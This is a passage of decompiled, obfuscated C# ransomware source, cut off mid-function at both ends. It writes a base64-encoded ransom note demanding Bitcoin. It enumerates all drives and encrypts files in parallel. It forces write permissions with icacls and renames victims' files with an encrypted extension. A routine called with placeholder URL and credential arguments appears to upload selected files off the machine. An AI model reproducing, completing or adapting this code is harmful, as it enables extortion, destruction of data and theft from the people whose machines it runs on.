				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string hselTMavQtkB(string string_0)
	{
		string text = Path.GetTempPath() + "\\RESTORE_FILES_INFO.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(XKJIixIieoUFn("QWxsIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZCBkdWUgdG8gYSBzZWN1cml0eSBwcm9ibGVtIHdpdGggeW91ciBQQy4gSWYgeW91IHdhbnQgdG8gcmVzdG9yZSB0aGVtLCB3cml0ZSB1cyB0byB0aGUgZS1tYWlsIFRpYmVyaWFub0Bhb2wuY29tDQpZb3UgaGF2ZSB0byBwYXkgZm9yIGRlY3J5cHRpb24gaW4gQml0Y29pbnMuIFRoZSBwcmljZSBkZXBlbmRzIG9uIGhvdyBmYXN0IHlvdSB3cml0ZSB0byB1cy4gQWZ0ZXIgcGF5bWVudCB3ZSB3aWxsIHNlbmQgeW91IHRoZSB0b29sIHRoYXQgd2lsbCBkZWNyeXB0IGFsbCB5b3VyIGZpbGVzLiANCkZyZWUgZGVjcnlwdGlvbiBhcyBndWFyYW50ZWUNCkJlZm9yZSBwYXlpbmcgeW91IGNhbiBzZW5kIHVzIHVwIHRvIDUgZmlsZXMgZm9yIGZyZWUgZGVjcnlwdGlvbi4gVGhlIHRvdGFsIHNpemUgb2YgZmlsZXMgbXVzdCBiZSBsZXNzIHRoYW4gNE1iIChub24gYXJjaGl2ZWQpLCBhbmQgZmlsZXMgc2hvdWxkIG5vdCBjb250YWluIHZhbHVhYmxlIGluZm9ybWF0aW9uLiAoZGF0YWJhc2VzLGJhY2t1cHMsIGxhcmdlIGV4Y2VsIHNoZWV0cywgZXRjLikgDQpIb3cgdG8gb2J0YWluIEJpdGNvaW5zDQpUaGUgZWFzaWVzdCB3YXkgdG8gYnV5IGJpdGNvaW5zIGlzIExvY2FsQml0Y29pbnMgc2l0ZS4gWW91IGhhdmUgdG8gcmVnaXN0ZXIsIGNsaWNrICdCdXkgYml0Y29pbnMnLCBhbmQgc2VsZWN0IHRoZSBzZWxsZXIgYnkgcGF5bWVudCBtZXRob2QgYW5kIHByaWNlLiANCmh0dHBzOi8vbG9jYWxiaXRjb2lucy5jb20vYnV5X2JpdGNvaW5zIA0KQWxzbyB5b3UgY2FuIGZpbmQgb3RoZXIgcGxhY2VzIHRvIGJ1eSBCaXRjb2lucyBhbmQgYmVnaW5uZXJzIGd1aWRlIGhlcmU6IA0KaHR0cDovL3d3dy5jb2luZGVzay5jb20vaW5mb3JtYXRpb24vaG93LWNhbi1pLWJ1eS1iaXRjb2lucy8gDQpBdHRlbnRpb24hDQpEbyBub3QgcmVuYW1lIGVuY3J5cHRlZCBmaWxlcy4gDQpEbyBub3QgdHJ5IHRvIGRlY3J5cHQgeW91ciBkYXRhIHVzaW5nIHRoaXJkIHBhcnR5IHNvZnR3YXJlLCBpdCBtYXkgY2F1c2UgcGVybWFuZW50IGRhdGEgbG9zcy4gDQpEZWNyeXB0aW9uIG9mIHlvdXIgZmlsZXMgd2l0aCB0aGUgaGVscCBvZiB0aGlyZCBwYXJ0aWVzIG1heSBjYXVzZSBpbmNyZWFzZWQgcHJpY2UgKHRoZXkgYWRkIHRoZWlyIGZlZSB0byBvdXIpIG9yIHlvdSBjYW4gYmVjb21lIGEgdmljdGltIG9mIGEgc2NhbS4g"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(XKJIixIieoUFn("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(string_0);
				if (YxnJxsROHGpBEI)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(XKJIixIieoUFn("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(CmYAejDgYJsctGHm.tGhpPKuyPxdeK());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !xSIJBVFhcrJvfz)
				{
					File.AppendAllText(text, "\r\nAdditional KeyId:\r\n" + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (HRuXHUgomikt)
			{
				try
				{
					File.AppendAllText(kCftkBXDnujA, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void tasLsUSzKYgWhi(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		IzBeUjxikrftX.FELNnuhKENJh CS_0024_003C_003E8__locals0 = new IzBeUjxikrftX();
		CS_0024_003C_003E8__locals0.VKaFkoznxbVT = string_1;
		CS_0024_003C_003E8__locals0.ZzuoScIuyjsQSwe = string_2;
		CS_0024_003C_003E8__locals0.TgmCNzELmTPb = string_3;
		CS_0024_003C_003E8__locals0.UlDUtrXojIVQov = string_4;
		JIAoluZZnYH = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.TgmCNzELmTPb);
		DriveInfo[] array = null;
		if (string_0[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !nlODfRjnVhuyHV.Contains(array[i].Name))
					{
						nlODfRjnVhuyHV.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!nlODfRjnVhuyHV.Contains(string_0[j]))
				{
					nlODfRjnVhuyHV.Add(string_0[j]);
				}
			}
		}
		if (nlODfRjnVhuyHV.Contains(XKJIixIieoUFn("Qzpc")) && TiRnMaBpzkm == "YES")
		{
			nlODfRjnVhuyHV.Remove(XKJIixIieoUFn("Qzpc"));
		}
		Parallel.ForEach(nlODfRjnVhuyHV, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new IzBeUjxikrftX.FELNnuhKENJh();
			CS_0024_003C_003E8__locals0.TvMwqKguod = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.hwBFQyFIuyQyBwP = string_0;
			if (DkGKAkKksBrre && !gotnrzqTwtuXaGE().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						OgqjasYecM(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.hwBFQyFIuyQyBwP);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (jOXeuDmfknLZmaw == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					qGZfsRSgDcvhqd(CS_0024_003C_003E8__locals0.hwBFQyFIuyQyBwP, CS_0024_003C_003E8__locals0.TvMwqKguod.VKaFkoznxbVT, CS_0024_003C_003E8__locals0.TvMwqKguod.UlDUtrXojIVQov, CS_0024_003C_003E8__locals0.TvMwqKguod.ZzuoScIuyjsQSwe, CS_0024_003C_003E8__locals0.TvMwqKguod.TgmCNzELmTPb);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				qGZfsRSgDcvhqd(CS_0024_003C_003E8__locals0.hwBFQyFIuyQyBwP, CS_0024_003C_003E8__locals0.VKaFkoznxbVT, CS_0024_003C_003E8__locals0.UlDUtrXojIVQov, CS_0024_003C_003E8__locals0.ZzuoScIuyjsQSwe, CS_0024_003C_003E8__locals0.TgmCNzELmTPb);
			}
		});
	}

	public static void qGZfsRSgDcvhqd(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (ZMkmxcVENGylaUJ == "NO")
		{
			list = xjEfBjOwMJhykw(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = SiqkJpwgYTfD.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f3;
					}
				}
				if ((MpjSKlCTIVmms == "NO" && !item.EndsWith(text)) || fuxMXSqYBU.Contains(item))
				{
					continue;
				}
				if (BzdPLbixsX == "YES")
				{
					try
					{
						if (wAKzbuUMHhlqNq.XGtUxyNCbAzVs(item))
						{
							wAKzbuUMHhlqNq.KBXgqJPVcgBbLe(item);
						}
					}
					catch
					{
					}
				}
				fuxMXSqYBU.Add(item);
				if (!HBwkcxyqvEtVP.Contains(Path.GetDirectoryName(item)))
				{
					HBwkcxyqvEtVP.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (MsXKPMolFXtq == "YES" && fileStream.Length > Convert.ToInt32(dlYfCorqiUsc) * 1024 * 1024 && !list3.Contains(text))
					{
						if (EpcuvjLUVs == "YES")
						{
							foreach (string item2 in QEQDItjwRt)
							{
								if (item.ToLower().EndsWith(item2) && PyEgbvgDxtxm == "YES")
								{
									if (Convert.ToInt32(WTlibewEpYC) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && PyEgbvgDxtxm == "NO")
								{
									try
									{
										CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = WffqVboAdbw.ZsrPQLMwHRSEDPmm(item, Convert.ToInt32(dlYfCorqiUsc) * 1024 * 1024);
						byte[] sDetFbTBtkhqI = WffqVboAdbw.svujRJbmtni(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						WffqVboAdbw.vokiIpTrQqjl(item, sDetFbTBtkhqI);
						if (string_2 != ".*")
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != ".*")
					{
						VCWpaghcUw(item, item + string_2, JIAoluZZnYH);
					}
					else
					{
						VCWpaghcUw(item, item + ".part", JIAoluZZnYH);
					}
				}
				catch (Exception)
				{
				}
				IL_02f3:;
			}
		}
	}

	public static void jZtJHYGNvMQ(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		SMHQoYVqmFryqDhh.cxwDuacTAsYRPIQ CS_0024_003C_003E8__locals0 = new SMHQoYVqmFryqDhh();
		CS_0024_003C_003E8__locals0.izdizlukjze = list_0;
		CS_0024_003C_003E8__locals0.iaaUPMfAbF = string_1;
		CS_0024_003C_003E8__locals0.YUQScPcHxLQi = string_2;
		CS_0024_003C_003E8__locals0.FDEMDnoDkQOCHM = string_3;
		CS_0024_003C_003E8__locals0.warwRcNDKeG = new List<string> { "" };
		if (MpjSKlCTIVmms == "NO")
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.izdizlukjze.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					SMHQoYVqmFryqDhh.EbGXJwZiQHXBRf CS_0024_003C_003E8__locals1 = new SMHQoYVqmFryqDhh.EbGXJwZiQHXBRf();
					CS_0024_003C_003E8__locals1.pDcPGayaeXCih = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ = enumerator2.Current;
					if (CS_0024_003C_003E8__locals0.YUQScPcHxLQi.Length != 0)
					{
						string[] yUQScPcHxLQi2 = CS_0024_003C_003E8__locals0.YUQScPcHxLQi;
						int num2 = 0;
						while (num2 < yUQScPcHxLQi2.Length)
						{
							string value2 = yUQScPcHxLQi2[num2];
							if (!CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09f3;
						}
					}
					try
					{
						if (CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ.EndsWith(CS_0024_003C_003E8__locals0.iaaUPMfAbF))
						{
							goto IL_09f3;
						}
					}
					catch (Exception)
					{
						goto IL_09f3;
					}
					if (CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ.EndsWith(string_0) && !fuxMXSqYBU.Contains(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ))
					{
						if (BzdPLbixsX == "YES")
						{
							try
							{
								if (wAKzbuUMHhlqNq.XGtUxyNCbAzVs(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ))
								{
									wAKzbuUMHhlqNq.KBXgqJPVcgBbLe(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
								}
							}
							catch
							{
							}
						}
						fuxMXSqYBU.Add(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
						Thread thread3 = new Thread((ThreadStart)delegate
						{
							try
							{
								if (mGPgYiqNVpxAeD)
								{
									Console.WriteLine("File in process: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ).Length + " bytes");
									Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", fuxMXSqYBU.Count, VnshRzSTFwJvI, WEeJdcZxxnxI);
									Console.WriteLine("Time elapsed:  {0}", eulLLquaCJeYr.Elapsed);
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
						});
						thread3.Priority = ThreadPriority.Normal;
						thread3.IsBackground = true;
						thread3.Start();
						if (!HBwkcxyqvEtVP.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ)))
						{
							HBwkcxyqvEtVP.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ));
						}
						ETxqPZpYmRRS(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
						try
						{
							new TAmFrgCEjOqs().RIyyQUdfJyufLOiQ(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (mGPgYiqNVpxAeD)
									{
										Console.WriteLine("Setting write access permission: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ).Length + " bytes");
										Console.WriteLine("----------------------------------------------------------------------------");
									}
								}
								catch
								{
								}
								kpitRsUfUPt(XKJIixIieoUFn("aWNhY2xzLmV4ZQ=="), "\"" + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + "\"" + XKJIixIieoUFn("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + XKJIixIieoUFn("OkYgL1QgL0MgL1E="));
							}
						}
						catch (Exception ex18)
						{
							if (HRuXHUgomikt)
							{
								try
								{
									File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - Error while checking for user write access permission: " + ex18.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ).Length != 0L)
								{
									goto end_IL_02e2;
								}
								goto end_IL_02e2_2;
								end_IL_02e2:;
							}
							catch (Exception ex20)
							{
								if (HRuXHUgomikt)
								{
									try
									{
										File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - Error while reading if filesize is zero: " + ex20.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								WEeJdcZxxnxI++;
								goto end_IL_02e2_2;
							}
							if (!(MsXKPMolFXtq == "YES") || new FileInfo(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ).Length <= Convert.ToInt32(dlYfCorqiUsc) * 1024 * 1024 || CS_0024_003C_003E8__locals0.warwRcNDKeG.Contains(string_0))
							{
								if (YxnJxsROHGpBEI)
								{
									CS_0024_003C_003E8__locals0.iaaUPMfAbF = sPVXhXLBBzIUR + CS_0024_003C_003E8__locals0.iaaUPMfAbF;
								}
								string text3 = TyTofGcmTVMdzo.yJvKyXjrknPiH(32);
								string s3 = SkKwndcWHaj.LJWdNIWcIsNR(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.iaaUPMfAbF != ".*")
								{
									if (!KTdzEFOlwiRwULiD)
									{
										if (!xSIJBVFhcrJvfz)
										{
											fZGtMsFkyjz(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, JIAoluZZnYH);
										}
										else
										{
											fZGtMsFkyjz(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!xSIJBVFhcrJvfz)
											{
												caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, JIAoluZZnYH);
											}
											else
											{
												caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex22)
										{
											if (HRuXHUgomikt)
											{
												try
												{
													File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - Error while fully writing to file: " + ex22.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
											WEeJdcZxxnxI++;
											try
											{
												File.Move(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
											}
											catch (Exception)
											{
											}
											goto end_IL_02e2_2;
										}
									}
								}
								else if (!KTdzEFOlwiRwULiD)
								{
									if (!xSIJBVFhcrJvfz)
									{
										fZGtMsFkyjz(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + ".part", JIAoluZZnYH);
									}
									else
									{
										fZGtMsFkyjz(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + ".part", Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!xSIJBVFhcrJvfz)
										{
											caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, JIAoluZZnYH);
										}
										else
										{
											caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex25)
									{
										if (HRuXHUgomikt)
										{
											try
											{
												File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - Error while fully writing to file: " + ex25.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										WEeJdcZxxnxI++;
										goto end_IL_02e2_2;
									}
								}
								if (xSIJBVFhcrJvfz)
								{
									if (CS_0024_003C_003E8__locals0.iaaUPMfAbF != ".*")
									{
										sOpOdEXhKGvUT(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, bytes3);
									}
									else
									{
										sOpOdEXhKGvUT(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, bytes3);
									}
								}
								goto IL_09f3;
							}
							CS_0024_003C_003E8__locals0 = new SMHQoYVqmFryqDhh.vMYjbqTIpVNnVt();
							CS_0024_003C_003E8__locals0.xOPGAPzknzyn = CS_0024_003C_003E8__locals1;
							CS_0024_003C_003E8__locals0.pDcPGayaeXCih = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.iaaUPMfAbF != ".*")
								{
									if (YxnJxsROHGpBEI)
									{
										CS_0024_003C_003E8__locals0.iaaUPMfAbF = sPVXhXLBBzIUR + CS_0024_003C_003E8__locals0.iaaUPMfAbF;
									}
									File.Move(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF);
								}
							}
							catch (Exception ex27)
							{
								if (HRuXHUgomikt)
								{
									try
									{
										File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - Error while renaming to crypted extension: " + ex27.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								WEeJdcZxxnxI++;
								goto end_IL_02e2_2;
							}
							CS_0024_003C_003E8__locals0.FfsvRAsxIMv = "";
							if (CS_0024_003C_003E8__locals0.iaaUPMfAbF != ".*")
							{
								CS_0024_003C_003E8__locals0.FfsvRAsxIMv = CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF;
							}
							else
							{
								CS_0024_003C_003E8__locals0.FfsvRAsxIMv = CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ;
							}
							if (EpcuvjLUVs == "YES")
							{
								Thread thread4 = new Thread((ThreadStart)delegate
								{
									foreach (string item in QEQDItjwRt)
									{
										if (CS_0024_003C_003E8__locals0.FfsvRAsxIMv.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.pDcPGayaeXCih.iaaUPMfAbF) && PyEgbvgDxtxm == "YES")
										{
											if (Convert.ToInt32(WTlibewEpYC) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.FfsvRAsxIMv).Length)
											{
												try
												{
													CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.FfsvRAsxIMv);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.FfsvRAsxIMv.ToLower().EndsWith(item) && PyEgbvgDxtxm == "NO")
										{
											try
											{
												CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.FfsvRAsxIMv);
											}
											catch
											{
											}
										}
									}
								});
								thread4.Priority = ThreadPriority.Normal;
								thread4.IsBackground = false;
								thread4.Start();
							}
							string text4 = TyTofGcmTVMdzo.yJvKyXjrknPiH(32);
							string s4 = SkKwndcWHaj.LJWdNIWcIsNR(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (rIDbJCbxXGOM == "NO")
							{
								byte[] array2 = null;
								byte[] byte_2 = WffqVboAdbw.ZsrPQLMwHRSEDPmm(CS_0024_003C_003E8__locals0.FfsvRAsxIMv, Convert.ToInt32(dlYfCorqiUsc) * 1024 * 1024);
								if (WffqVboAdbw.vokiIpTrQqjl(sDetFbTBtkhqI: (!WKWPaQWPQqrRRB) ? (xSIJBVFhcrJvfz ? WffqVboAdbw.svujRJbmtni(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WffqVboAdbw.svujRJbmtni(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.FDEMDnoDkQOCHM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (xSIJBVFhcrJvfz ? HgseoqLGvnctpdH.uFQulJKjke(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HgseoqLGvnctpdH.uFQulJKjke(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.FDEMDnoDkQOCHM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), TgyqupHXQPS: CS_0024_003C_003E8__locals0.FfsvRAsxIMv, JOMSerecoaWty: bytes4))
								{
									goto IL_09f3;
								}
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
								}
								catch (Exception)
								{
								}
							}
							else if (!xSIJBVFhcrJvfz)
							{
								if (QWgNsziBjsjPDSWc.GDBBRYhBRfPQ(CS_0024_003C_003E8__locals0.FfsvRAsxIMv, dlYfCorqiUsc, CS_0024_003C_003E8__locals0.FDEMDnoDkQOCHM))
								{
									goto IL_09f3;
								}
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (QWgNsziBjsjPDSWc.GDBBRYhBRfPQ(CS_0024_003C_003E8__locals0.FfsvRAsxIMv, dlYfCorqiUsc, text4, bytes4))
								{
									goto IL_09f3;
								}
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02e2_2:;
						}
						catch (Exception)
						{
							goto IL_09f3;
						}
					}
					continue;
					IL_09f3:
					CS_0024_003C_003E8__locals0.izdizlukjze.Remove(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.izdizlukjze, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new SMHQoYVqmFryqDhh.cxwDuacTAsYRPIQ();
			CS_0024_003C_003E8__locals0.pDcPGayaeXCih = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ = string_0;
			if (CS_0024_003C_003E8__locals0.YUQScPcHxLQi.Length != 0)
			{
				string[] yUQScPcHxLQi = CS_0024_003C_003E8__locals0.YUQScPcHxLQi;
				int num = 0;
				while (num < yUQScPcHxLQi.Length)
				{
					string value = yUQScPcHxLQi[num];
					if (!CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0978;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ.EndsWith(CS_0024_003C_003E8__locals0.iaaUPMfAbF))
				{
					goto IL_0978;
				}
			}
			catch (Exception)
			{
				goto IL_0978;
			}
			if (!fuxMXSqYBU.Contains(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ))
			{
				if (BzdPLbixsX == "YES")
				{
					try
					{
						if (wAKzbuUMHhlqNq.XGtUxyNCbAzVs(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ))
						{
							wAKzbuUMHhlqNq.KBXgqJPVcgBbLe(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
						}
					}
					catch
					{
					}
				}
				fuxMXSqYBU.Add(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (mGPgYiqNVpxAeD)
						{
							Console.WriteLine("File in process: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ).Length + " bytes");
							Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", fuxMXSqYBU.Count, VnshRzSTFwJvI, WEeJdcZxxnxI);
							Console.WriteLine("Time elapsed:  {0}", eulLLquaCJeYr.Elapsed);
							Console.WriteLine("----------------------------------------------------------------------------");
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!HBwkcxyqvEtVP.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ)))
				{
					HBwkcxyqvEtVP.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ));
				}
				ETxqPZpYmRRS(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
				try
				{
					new TAmFrgCEjOqs().RIyyQUdfJyufLOiQ(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, FileMode.Open, FileAccess.Write);
